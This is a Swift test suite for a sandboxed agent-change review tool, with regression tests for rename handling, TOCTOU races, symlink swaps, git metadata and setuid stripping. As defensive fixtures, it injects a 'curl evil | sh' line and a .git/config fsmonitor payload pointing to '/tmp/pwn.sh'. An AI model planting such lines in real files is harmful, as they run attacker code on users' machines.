#if canImport(Darwin)
import Darwin
#elseif canImport(Glibc)
import Glibc
#elseif canImport(Musl)
import Musl
#endif
import Foundation
import Testing
@testable import MudroomCore

/// Regression tests for the pre-launch review. Each was a repro of a bug;
/// they now assert the fixed behaviour. The finding id is in the name.
@Suite("Data safety", .serialized)
struct DataSafetyTests {
    func names(_ dir: URL) throws -> [String] {
        try FileManager.default.contentsOfDirectory(atPath: dir.path).sorted()
    }

    // MARK: H1. Case-only renames

    @Test("H1: a case-only rename (same content) keeps the file, under the new name, and undoes")
    func caseRenameSameContent() throws {
        let f = try Fixture { root in try write("hello\n", to: root.appendingPathComponent("Readme.md")) }
        #expect(rename(f.work.appendingPathComponent("Readme.md").path, f.work.appendingPathComponent("README.md").path) == 0)
        #expect(try f.diff().changes.map { "\($0.kind.rawValue) \($0.path)" } == ["added README.md", "deleted Readme.md"])
        let applier = Applier(handle: f.handle)
        let report = try applier.apply(paths: nil)
        #expect(report.conflicts.isEmpty)
        #expect(Set(report.applied) == ["README.md", "Readme.md"])
        #expect(try names(f.project) == ["README.md"])
        #expect(try read(f.project.appendingPathComponent("README.md")) == "hello\n")
        _ = try applier.undo()
        #expect(try names(f.project) == ["Readme.md"])
        #expect(try read(f.project.appendingPathComponent("Readme.md")) == "hello\n")
    }

    @Test("H1: a case-only rename plus an edit writes the new content under the new name")
    func caseRenameWithEdit() throws {
        let f = try Fixture { root in try write("hello\n", to: root.appendingPathComponent("Readme.md")) }
        unlink(f.work.appendingPathComponent("Readme.md").path)
        try write("hello world\n", to: f.work.appendingPathComponent("README.md"))
        let report = try Applier(handle: f.handle).apply(paths: nil)
        #expect(report.conflicts.isEmpty)
        #expect(try names(f.project) == ["README.md"])
        #expect(try read(f.project.appendingPathComponent("README.md")) == "hello world\n")
    }

    @Test("H1: applying only the new name of a case rename is refused, not reported as applied")
    func caseRenameHalf() throws {
        let f = try Fixture { root in try write("hello\n", to: root.appendingPathComponent("Readme.md")) }
        #expect(rename(f.work.appendingPathComponent("Readme.md").path, f.work.appendingPathComponent("README.md").path) == 0)
        let report = try Applier(handle: f.handle).apply(paths: ["README.md"])
        if Applier.isCaseInsensitive(f.project) {
            #expect(report.conflicts.map(\.path) == ["README.md"])
            #expect(report.alreadyApplied.isEmpty)
            #expect(try names(f.project) == ["Readme.md"])
        } else {
            #expect(report.applied == ["README.md"])
        }
    }

    // MARK: H2. Long names and type changes

    static let longName = String(repeating: "n", count: 250) + ".txt"   // 254 bytes

    @Test("H2: a file with a 254-byte name applies (temp names stay short)")
    func longNameModify() throws {
        let f = try Fixture { root in try write("v1\n", to: root.appendingPathComponent(Self.longName)) }
        try write("v2\n", to: f.work.appendingPathComponent(Self.longName))
        let report = try Applier(handle: f.handle).apply(paths: nil)
        #expect(report.conflicts.isEmpty)
        #expect(try read(f.project.appendingPathComponent(Self.longName)) == "v2\n")
    }

    @Test("H2: a type change on a long name applies, and undo brings the original file back")
    func longNameTypeChange() throws {
        let f = try Fixture { root in
            try write("precious\n", to: root.appendingPathComponent(Self.longName))
            try write("other\n", to: root.appendingPathComponent("other.txt"))
        }
        unlink(f.work.appendingPathComponent(Self.longName).path)
        symlink("other.txt", f.work.appendingPathComponent(Self.longName).path)
        let applier = Applier(handle: f.handle)
        let report = try applier.apply(paths: nil)
        #expect(report.conflicts.isEmpty)
        #expect(try FileNode.read(at: f.project.appendingPathComponent(Self.longName)) == .symlink(target: "other.txt"))
        let undo = try applier.undo()
        #expect(undo.restored.contains(Self.longName))
        #expect(try read(f.project.appendingPathComponent(Self.longName)) == "precious\n")
        #expect(try names(f.project).allSatisfy { !$0.hasPrefix(".mudroom-") })
    }

    @Test("H2: every rollback entry is in the journal before its step runs")
    func journalWrittenFirst() throws {
        let f = try Fixture { root in try write("a\n", to: root.appendingPathComponent("a.txt")) }
        try write("b\n", to: f.work.appendingPathComponent("a.txt"))
        let report = try Applier(handle: f.handle).apply(paths: nil)
        let bundle = try #require(report.bundle)
        let journal = try read(bundle.appendingPathComponent("journal.jsonl"))
        #expect(journal.contains("\"pending\":true") && journal.contains("a.txt"))
        // An apply killed before writing its manifest is still undoable from the journal.
        try FileManager.default.removeItem(at: bundle.appendingPathComponent("manifest.json"))
        let undo = try Applier(handle: f.handle).undo()
        #expect(undo.restored == ["a.txt"])
        #expect(try read(f.project.appendingPathComponent("a.txt")) == "a\n")
    }

    // MARK: H3. Apply what was reviewed

    @Test("H3: hunks are refused when work/ changed after review (no 'curl evil | sh' slipping in)")
    func hunkTOCTOU() throws {
        let base = (1...40).map { "line \($0)\n" }.joined()
        let f = try Fixture { root in try write(base, to: root.appendingPathComponent("f.txt")) }
        try write(base.replacingOccurrences(of: "line 3\n", with: "line three\n"), to: f.work.appendingPathComponent("f.txt"))
        let applier = Applier(handle: f.handle)
        let reviewed = ReviewedChanges(try f.diff().changes)
        try write(base.replacingOccurrences(of: "line 1\n", with: "curl evil | sh\n")
                      .replacingOccurrences(of: "line 3\n", with: "line three\n"), to: f.work.appendingPathComponent("f.txt"))
        let report = try applier.applyHunks(path: "f.txt", hunks: [1], reviewed: reviewed)
        #expect(report.applied.isEmpty)
        #expect(report.conflicts.first?.reason.contains("after you reviewed") == true)
        #expect(try read(f.project.appendingPathComponent("f.txt")) == base)
    }

    @Test("H3: whole-file applies refuse a file changed since review, and new files nobody saw")
    func wholeFileTOCTOU() throws {
        let f = try Fixture { root in try write("a\n", to: root.appendingPathComponent("a.txt")) }
        try write("reviewed\n", to: f.work.appendingPathComponent("a.txt"))
        let reviewed = ReviewedChanges(try f.diff().changes)
        try write("swapped\n", to: f.work.appendingPathComponent("a.txt"))
        try write("unseen\n", to: f.work.appendingPathComponent("new.txt"))
        let report = try Applier(handle: f.handle).apply(paths: nil, reviewed: reviewed)
        #expect(Set(report.conflicts.map(\.path)) == ["a.txt", "new.txt"])
        #expect(report.applied.isEmpty)
        #expect(try read(f.project.appendingPathComponent("a.txt")) == "a\n")
        #expect(!exists(f.project.appendingPathComponent("new.txt")))
    }

    @Test("H3: bytes written are the bytes hashed in the diff, even if work/ changes in between")
    func stagedHashCheck() throws {
        let f = try Fixture { root in try write("a\n", to: root.appendingPathComponent("a.txt")) }
        try write("b\n", to: f.work.appendingPathComponent("a.txt"))
        let diff = try f.diff()
        try write("c\n", to: f.work.appendingPathComponent("a.txt"))
        let report = try Applier(handle: f.handle).apply(paths: nil, diff: diff)
        #expect(report.applied.isEmpty)
        #expect(report.conflicts.first?.reason.contains("changed in the agent's copy") == true)
        #expect(try read(f.project.appendingPathComponent("a.txt")) == "a\n")
    }

    @Test("H3: a work/ folder swapped for a symlink is not followed when copying out")
    func symlinkSwap() throws {
        let tmp = try TempDir()
        let secret = tmp.path("secret")
        try write("ssh key\n", to: secret.appendingPathComponent("id"))
        let f = try Fixture { root in try write("x\n", to: root.appendingPathComponent("d/id")) }
        try write("y\n", to: f.work.appendingPathComponent("d/id"))
        let diff = try f.diff()
        // After the scan, d/ becomes a symlink to a folder outside work/.
        try FileManager.default.removeItem(at: f.work.appendingPathComponent("d"))
        symlink(secret.path, f.work.appendingPathComponent("d").path)
        let report = try Applier(handle: f.handle).apply(paths: nil, diff: diff)
        #expect(report.applied.isEmpty)
        #expect(try read(f.project.appendingPathComponent("d/id")) == "x\n")
        #expect(throws: (any Error).self) { try SafeFS.readBeneath(f.work, "d/id") }
    }

    @Test("H3: a FIFO swapped in for a file doesn't hang a read")
    func fifoSwap() throws {
        let f = try Fixture { root in try write("x\n", to: root.appendingPathComponent("f")) }
        unlink(f.work.appendingPathComponent("f").path)
        #expect(mkfifo(f.work.appendingPathComponent("f").path, 0o644) == 0)
        #expect(throws: (any Error).self) { try SafeFS.readBeneath(f.work, "f") }
        #expect(try f.diff().changes.map(\.kind) == [.typeChanged])
    }

    @Test("H3/M7: apply and undo are refused while the runner holds its lock")
    func guardWhileRunning() throws {
        var f = try Fixture { root in try write("a\n", to: root.appendingPathComponent("a.txt")) }
        f.handle.session.started = Date()
        try f.handle.setStatus(.running)
        let lock = try #require(FileLock.tryAcquire(f.handle.runnerLockURL))
        #expect(throws: MudroomError.self) { try SessionGuard.ensureIdle(f.handle) }
        lock.release()
        try SessionGuard.ensureIdle(f.handle)
    }

    @Test("M7: a stale runnerPID reused by a newer process is not 'running'")
    func pidReuse() throws {
        var f = try Fixture { try write("a\n", to: $0.appendingPathComponent("a.txt")) }
        // The runner died a minute ago and its PID went to a new process.
        let other = Process()
        other.executableURL = URL(fileURLWithPath: "/bin/sleep")
        other.arguments = ["10"]
        try other.run()
        defer { other.terminate(); other.waitUntilExit() }
        f.handle.session.runnerPID = other.processIdentifier
        f.handle.session.started = Date().addingTimeInterval(-60)
        try f.handle.setStatus(.running)
        #expect(!f.handle.isRunnerAlive)
        // Another user's process (EPERM) is not ours either; as root there is none.
        if getuid() != 0 {
            f.handle.session.runnerPID = 1
            try f.handle.setStatus(.running)
            #expect(!f.handle.isRunnerAlive)
        }
    }

    @Test("M7: legacy sessions without a lock count a live pid only if it started before the run")
    func legacyStartTime() throws {
        var f = try Fixture { try write("a\n", to: $0.appendingPathComponent("a.txt")) }
        f.handle.session.runnerPID = getpid()
        f.handle.session.started = Date()
        try f.handle.setStatus(.running)
        #expect(f.handle.isRunnerAlive)              // this process did start before
        f.handle.session.started = Date(timeIntervalSince1970: 1_000_000)
        try f.handle.setStatus(.running)
        #expect(!f.handle.isRunnerAlive)             // a pid newer than the run is a reuse
    }

    // MARK: M1. git internals

    @Test("M1: nested repos' .git is git metadata, never applied without --include-git")
    func nestedGit() throws {
        let f = try Fixture { root in try write("[core]\n", to: root.appendingPathComponent("vendor/lib/.git/config")) }
        try write("[core]\n\tfsmonitor = /tmp/pwn.sh\n", to: f.work.appendingPathComponent("vendor/lib/.git/config"))
        let d = try f.diff()
        #expect(d.changes.isEmpty)
        #expect(d.gitMetadataChanges.map(\.path) == ["vendor/lib/.git/config"])
        _ = try Applier(handle: f.handle).apply(paths: nil)
        #expect(try read(f.project.appendingPathComponent("vendor/lib/.git/config")) == "[core]\n")
        let explicit = try Applier(handle: f.handle).apply(paths: ["vendor/lib/.git/config"])
        #expect(explicit.applied.isEmpty && explicit.skipped.first?.reason.contains("include-git") == true)
    }

    @Test("M1: .GIT (any case) is git metadata too")
    func upperCaseGit() throws {
        let f = try Fixture { root in try write("x\n", to: root.appendingPathComponent("a.txt")) }
        try write("[core]\n\tfsmonitor = /tmp/pwn.sh\n", to: f.work.appendingPathComponent(".GIT/config"))
        let d = try f.diff()
        #expect(d.changes.isEmpty)
        #expect(Set(d.gitMetadataChanges.map(\.path)) == [".GIT", ".GIT/config"])
        _ = try Applier(handle: f.handle).apply(paths: nil)
        #expect(!exists(f.project.appendingPathComponent(".git/config")))
        #expect(!exists(f.project.appendingPathComponent(".GIT")))
    }

    @Test("M1: files the host acts on are flagged and not selected by default")
    func hostRiskFlags() {
        for p in [".envrc", "a/.envrc", ".vscode/tasks.json", ".husky/pre-commit", ".gitmodules", "x.code-workspace"] {
            #expect(Differ.hostRisk(p) != nil, "\(p)")
        }
        #expect(Differ.hostRisk("src/main.swift") == nil)
        let c = Change(path: ".envrc", kind: .added, before: .absent, after: .file(mode: 0o644, size: 1, sha256: "x"))
        #expect(!FileEntry(change: c, content: .lines(added: 1, removed: 0)).selectedByDefault)
        #expect(TerminalReview(changes: [c]).selectedPaths.isEmpty)
    }

    // MARK: M2/M3. Unreadable and special entries

    @Test("M2: a mode-000 file in work/ is one unreadable entry; everything else still diffs and applies",
          .disabled(if: getuid() == 0, "root can read mode-000 files"))
    func unreadableWorkFile() throws {
        let f = try Fixture { root in try write("a\n", to: root.appendingPathComponent("a.txt")) }
        try write("a2\n", to: f.work.appendingPathComponent("a.txt"))
        try write("x\n", to: f.work.appendingPathComponent("trap"), mode: 0o000)
        defer { chmod(f.work.appendingPathComponent("trap").path, 0o644) }
        let d = try f.diff()
        #expect(d.changes.map { "\($0.kind.rawValue) \($0.path)" } == ["modified a.txt", "unreadable trap"])
        let report = try Applier(handle: f.handle).apply(paths: nil)
        #expect(report.applied == ["a.txt"])
        #expect(report.skipped.map(\.path) == ["trap"])
        #expect(!exists(f.project.appendingPathComponent("trap")))
    }

    @Test("M2: a mode-000 directory in work/ is reported once, its children aren't 'deleted'",
          .disabled(if: getuid() == 0, "root can read mode-000 directories"))
    func unreadableWorkDir() throws {
        let f = try Fixture { root in try write("in\n", to: root.appendingPathComponent("d/in.txt")) }
        chmod(f.work.appendingPathComponent("d").path, 0o000)
        defer { chmod(f.work.appendingPathComponent("d").path, 0o755) }
        let d = try f.diff()
        #expect(d.changes.map { "\($0.kind.rawValue) \($0.path)" } == ["unreadable d"])
        _ = try Applier(handle: f.handle).apply(paths: nil)
        #expect(try read(f.project.appendingPathComponent("d/in.txt")) == "in\n")
    }

    @Test("M3: a project with an unreadable file can be cloned; the file is listed as skipped",
          .disabled(if: getuid() == 0, "root can read mode-000 files"))
    func unreadableProjectFile() throws {
        let tmp = try TempDir()
        let project = tmp.path("p")
        try write("ok\n", to: project.appendingPathComponent("a.txt"))
        try write("secret\n", to: project.appendingPathComponent("db/data"), mode: 0o000)
        defer { chmod(project.appendingPathComponent("db/data").path, 0o644) }
        let store = SessionStore(root: tmp.path("store"))
        let h = try store.create(project: project, command: [], image: "t")
        #expect(h.session.cloneSkipped?.map(\.path) == ["db/data"])
        #expect(try Differ.compare(base: h.base, work: h.work).isEmpty)
        #expect(try read(h.work.appendingPathComponent("a.txt")) == "ok\n")
    }

    @Test("M3: a project with a unix socket and a FIFO clones, with and without clonefile")
    func socketInProject() throws {
        let tmp = try TempDir()
        // Short path: sun_path holds about 100 bytes.
        let project = URL(fileURLWithPath: "/tmp/mr-sock-\(getpid())-\(UInt16.random(in: 0...9999))", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: project) }
        try write("x\n", to: project.appendingPathComponent("a.txt"))
        try FileManager.default.createDirectory(at: project.appendingPathComponent("tmp"), withIntermediateDirectories: true)
        #expect(mkfifo(project.appendingPathComponent("tmp/fifo").path, 0o644) == 0)
        let fd = socket(AF_UNIX, Sock.stream, 0)
        defer { close(fd) }
        var addr = sockaddr_un()
        addr.sun_family = sa_family_t(AF_UNIX)
        let sp = Array(project.appendingPathComponent("tmp/s").path.utf8)
        withUnsafeMutableBytes(of: &addr.sun_path) { raw in
            for (i, b) in sp.prefix(raw.count - 1).enumerated() { raw[i] = b }
        }
        let rc = withUnsafePointer(to: &addr) { $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
            bind(fd, $0, socklen_t(MemoryLayout<sockaddr_un>.size)) } }
        #expect(rc == 0)
        let store = SessionStore(root: tmp.path("store"))
        for clone in [true, false] {
            let h = try store.create(project: project, command: [], image: "t", allowClonefile: clone)
            #expect(exists(h.work.appendingPathComponent("a.txt")))
            if !clone { #expect(Set(h.session.cloneSkipped?.map(\.path) ?? []) == ["tmp/fifo", "tmp/s"]) }
        }
    }

    // MARK: M4/M5. Concurrent applies, partial undo

    @Test("M4: concurrent applies in one session get separate bundles")
    func concurrentApplies() throws {
        for _ in 0..<15 {
            let f = try Fixture { root in
                for i in 0..<10 {
                    try write("v1 \(i)\n", to: root.appendingPathComponent("a\(i).txt"))
                    try write("v1 \(i)\n", to: root.appendingPathComponent("b\(i).txt"))
                }
            }
            for i in 0..<10 {
                try write("v2\n", to: f.work.appendingPathComponent("a\(i).txt"))
                try write("v2\n", to: f.work.appendingPathComponent("b\(i).txt"))
            }
            let h = f.handle
            let a = (0..<10).map { "a\($0).txt" }, b = (0..<10).map { "b\($0).txt" }
            let reports = LockedBox<[ApplyReport]>([])
            DispatchQueue.concurrentPerform(iterations: 2) { i in
                if let r = try? Applier(handle: h).apply(paths: i == 0 ? a : b) {
                    reports.value = reports.value + [r]
                }
            }
            #expect(reports.value.count == 2)
            #expect(Set(reports.value.compactMap(\.bundle?.lastPathComponent)).count == 2)
            _ = try Applier(handle: h).undo()
            _ = try Applier(handle: h).undo()
            for p in a + b { #expect(try read(f.project.appendingPathComponent(p)).hasPrefix("v1")) }
        }
    }

    @Test("M5: an undo with a conflict keeps that path undoable")
    func undoConflictKeepsPath() throws {
        let f = try Fixture { root in
            try write("a1\n", to: root.appendingPathComponent("a.txt"))
            try write("b1\n", to: root.appendingPathComponent("b.txt"))
        }
        try write("a2\n", to: f.work.appendingPathComponent("a.txt"))
        try write("b2\n", to: f.work.appendingPathComponent("b.txt"))
        let applier = Applier(handle: f.handle)
        _ = try applier.apply(paths: nil)
        try write("user\n", to: f.project.appendingPathComponent("a.txt"))
        let first = try applier.undo()
        #expect(first.conflicts.map(\.path) == ["a.txt"])
        #expect(first.restored == ["b.txt"] && first.remaining == 1)
        #expect(applier.canUndo)
        try write("a2\n", to: f.project.appendingPathComponent("a.txt"))
        let second = try applier.undo()
        #expect(second.restored == ["a.txt"] && second.remaining == 0)
        #expect(try read(f.project.appendingPathComponent("a.txt")) == "a1\n")
        #expect(!applier.canUndo)
    }

    // MARK: L3, L5, L7

    @Test("L7: hunks and apply name a path the same way")
    func hunkPathNormalized() throws {
        #expect(Applier.normalizePath("./src/x.swift") == "src/x.swift")
        #expect(Applier.normalizePath("src//x.swift/") == "src/x.swift")
        let f = try Fixture { root in try write("a\nb\n", to: root.appendingPathComponent("src/x.txt")) }
        try write("a\nB\n", to: f.work.appendingPathComponent("src/x.txt"))
        let path = Applier.normalizePath("./src/x.txt")
        let change = try #require(try Differ.compare(base: f.handle.base, work: f.handle.work).changes.first { $0.path == path })
        #expect(try Applier(handle: f.handle).hunks(for: change)?.count == 1)
    }

    @Test("L3: setuid and setgid bits are never applied")
    func setuidStripped() throws {
        let f = try Fixture { root in try write("#!/bin/sh\n", to: root.appendingPathComponent("tool")) }
        chmod(f.work.appendingPathComponent("tool").path, 0o4755)
        try write("#!/bin/sh\nnew\n", to: f.work.appendingPathComponent("tool2"), mode: 0o2755)
        let report = try Applier(handle: f.handle).apply(paths: nil)
        #expect(report.conflicts.isEmpty)
        #expect(try modeOf(f.project.appendingPathComponent("tool")) == 0o755)
        #expect(try modeOf(f.project.appendingPathComponent("tool2")) == 0o755)
        #expect(ReviewSnapshot.permString(0o4755) == "4755 (rwsr-xr-x)")
        // A second apply sees it as done.
        #expect(try Applier(handle: f.handle).apply(paths: nil).applied.isEmpty)
    }

    @Test("L5: a corrupt session.json is listed as broken and can be removed")
    func corruptSessionJSON() throws {
        let f = try Fixture { try write("a\n", to: $0.appendingPathComponent("a.txt")) }
        try Data("{".utf8).write(to: f.handle.directory.appendingPathComponent("session.json"))
        #expect(try f.store.list().isEmpty)
        #expect(f.store.brokenSessions().map(\.lastPathComponent) == [f.handle.session.id])
        #expect(throws: MudroomError.self) { try f.store.open(f.handle.session.id) }
        try f.store.discardBroken(f.handle.session.id)
        #expect(!FileManager.default.fileExists(atPath: f.handle.directory.path))
        #expect(exists(f.project.appendingPathComponent("a.txt")))
    }

    // MARK: Line diff

    @Test("fuzz: apply(all)==work, apply(none)==base, hunks don't overlap, context matches")
    func lineDiffFuzz() {
        var rng = SeededGenerator(seed: 7)
        let pool: [String] = ["a\n", "b\n", "c\r\n", "d\r\n", "\n", "\r\n", "e", "f\r", "a", "x\n"]
        func randomText() -> Data {
            let n = Int.random(in: 0...30, using: &rng)
            var s = (0..<n).map { _ in pool[Int.random(in: 0..<8, using: &rng)] }.joined()
            if Bool.random(using: &rng) { s += pool[Int.random(in: 6...8, using: &rng)] }
            return Data(s.utf8)
        }
        var failures = 0
        for _ in 0..<3000 {
            let b = randomText(), w = randomText()
            let bl = TextLines(b), wl = TextLines(w)
            let hunks = LineDiff.hunks(base: bl, work: wl)
            if LineDiff.apply(hunks, selected: Set(hunks.map(\.id)), base: bl, work: wl).data != w { failures += 1; continue }
            if LineDiff.apply(hunks, selected: [], base: bl, work: wl).data != b { failures += 1; continue }
            for (x, y) in zip(hunks, hunks.dropFirst()) where x.oldRange.upperBound > y.oldRange.lowerBound { failures += 1 }
            for h in hunks {
                for c in h.lines where c.kind == .context && bl.lines[c.oldNumber! - 1] != wl.lines[c.newNumber! - 1] { failures += 1 }
            }
        }
        #expect(failures == 0)
    }

    @Test("Myers give-up path (edit distance > 1500) still round-trips")
    func myersGiveUp() {
        let b = Data((0..<4000).map { "b\($0)\n" }.joined().utf8)
        let w = Data((0..<4000).map { $0 % 2 == 0 ? "w\($0)\n" : "b\($0)\n" }.joined().utf8)
        let bl = TextLines(b), wl = TextLines(w)
        let hunks = LineDiff.hunks(base: bl, work: wl)
        #expect(LineDiff.apply(hunks, selected: Set(hunks.map(\.id)), base: bl, work: wl).data == w)
    }
}

@Suite("Review data")
struct ReviewDataTests {
    @Test("selection: defaults skip flagged files; a hidden deleted folder goes when all under it is selected")
    func selection() throws {
        let f = try Fixture { root in
            try write("x\n", to: root.appendingPathComponent("gone/a.txt"))
            try write("x\n", to: root.appendingPathComponent("gone/sub/b.txt"))
            try write("x\n", to: root.appendingPathComponent("keep.txt"))
        }
        try FileManager.default.removeItem(at: f.work.appendingPathComponent("gone"))
        try write("export X=1\n", to: f.work.appendingPathComponent(".envrc"))
        let snap = try ReviewSnapshot.load(f.handle)
        #expect(Set(snap.hiddenDeletedDirectories) == ["gone", "gone/sub"])
        var sel = ReviewSelection()
        for e in snap.files { sel.setDefault(e) }
        var p = sel.pending(snap)
        #expect(!p.paths.contains(".envrc"))
        #expect(Set(p.paths) == ["gone/a.txt", "gone/sub/b.txt", "gone", "gone/sub"])
        #expect(p.rowCount == 2)
        sel.set(snap.entry("gone/sub/b.txt")!, false)
        p = sel.pending(snap)
        #expect(Set(p.paths) == ["gone/a.txt"])
        let report = try Applier(handle: f.handle).apply(paths: p.paths, reviewed: snap.reviewed)
        #expect(report.conflicts.isEmpty)
    }

    @Test("big folders collapse into one row; added files load line counts, not lines")
    func collapse() throws {
        let f = try Fixture { root in try write("x\n", to: root.appendingPathComponent("a.txt")) }
        for i in 0..<(ReviewSnapshot.collapseThreshold + 5) {
            try write("l1\nl2\n", to: f.work.appendingPathComponent("gen/x/f\(i).js"))
        }
        let snap = try ReviewSnapshot.load(f.handle)
        #expect(snap.folders.map(\.path) == ["gen"])
        #expect(snap.folders[0].rows.count == ReviewSnapshot.collapseThreshold + 5)
        let e = try #require(snap.entry("gen/x/f0.js"))
        guard case .lines(2, 0) = e.content else { Issue.record("\(e.content)"); return }
        #expect(try ReviewSnapshot.detail(e, before: f.handle.base, after: f.work).first?.lines.count == 2)
        #expect(snap.totalAdded == 2 * (ReviewSnapshot.collapseThreshold + 5))
    }
}

struct SeededGenerator: RandomNumberGenerator {
    var state: UInt64
    init(seed: UInt64) { state = seed }
    mutating func next() -> UInt64 {
        state = state &* 6364136223846793005 &+ 1442695040888963407
        return state
    }
}
